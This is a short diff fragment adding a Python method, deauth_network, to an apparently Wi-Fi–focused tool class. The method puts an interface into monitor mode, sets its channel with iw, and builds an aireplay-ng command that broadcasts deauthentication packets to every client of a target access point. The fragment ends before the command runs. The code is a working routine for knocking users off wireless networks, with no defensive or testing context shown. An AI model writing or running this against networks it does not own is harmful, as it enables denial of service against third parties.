@@ -1,0 +1,37 @@
+    def deauth_network(self, ap_bssid: str, count: int = 5) -> bool:
+        """Send deauthentication packets to all clients on a network.
+        
+        Args:
+            ap_bssid: MAC address of the access point
+            count: Number of deauth packets to send
+            
+        Returns:
+            True if successful, False otherwise
+        """
+        with self.lock:
+            # Enable monitor mode
+            if not self._enable_monitor_mode():
+                logging.error("Failed to enable monitor mode for deauth attack")
+                return False
+            
+            try:
+                # Get AP channel
+                ap = self.access_points.get(ap_bssid)
+                if ap:
+                    channel = ap.channel
+                else:
+                    logging.warning(f"AP {ap_bssid} not found in scan results, using channel 1")
+                    channel = 1
+                
+                # Set channel
+                subprocess.run(["iw", "dev", self.monitor_interface.name, "set", "channel", str(channel)], 
+                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                
+                # Send broadcast deauth packets
+                logging.info(f"Sending {count} broadcast deauth packets for AP {ap_bssid}")
+                aireplay_cmd = [
+                    "aireplay-ng",
+                    "--deauth", str(count),
+                    "-a", ap_bssid,
+                    self.monitor_interface.name
+                ]
